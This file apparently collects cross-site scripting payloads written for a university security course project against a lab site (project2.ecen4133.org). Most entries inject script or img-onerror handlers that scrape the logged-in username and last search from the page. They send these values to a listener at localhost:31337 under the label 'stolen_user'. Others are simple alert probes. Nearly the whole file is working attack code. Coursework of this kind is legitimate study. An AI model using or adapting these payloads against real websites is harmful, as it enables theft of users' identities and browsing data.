<script>alert("yodobashi camera")</script>

<script>
    $.get("https://project2.ecen4133.org/search?xssdefense=0", function (data) {
        re = /<span id="logged-in-user">.*<\/span>/;
        var results = re.exec(data);
        var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');
        re = /<a href="search\?q=.*<\/a>/m;
        data = data.replace(re, '');
        results = re.exec(data);
        var last_search = results[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');
        console.log("LAST SEARCH: " + last_search);
        console.log(data);
        $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search, function (data) {
        });
    });
</script>

<IMG SRC=/ onerror=
    $.get("https://project2.ecen4133.org/search?xssdefense=0", function (data) {    

    });
></img>

<IMG SRC=/ onerror=
    alert("woot");
></img>
      
<IMG SRC=/ onerror=
    $.get('https://project2.ecen4133.org/search?xssdefense=0', function (data) {
        re = /<span id="logged-in-user">.*<\/span>/;
        var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');

        re = /<a href="search\?q=.*<\/a>/m;
        var last_search = re.exec(data)[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');

        $.get('http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search);
    });
></img>

<IMG SRC="file:///C:/Users/micha/OneDrive%20-%20UCB-O365/Computer%20Security/Project%202/payload.js">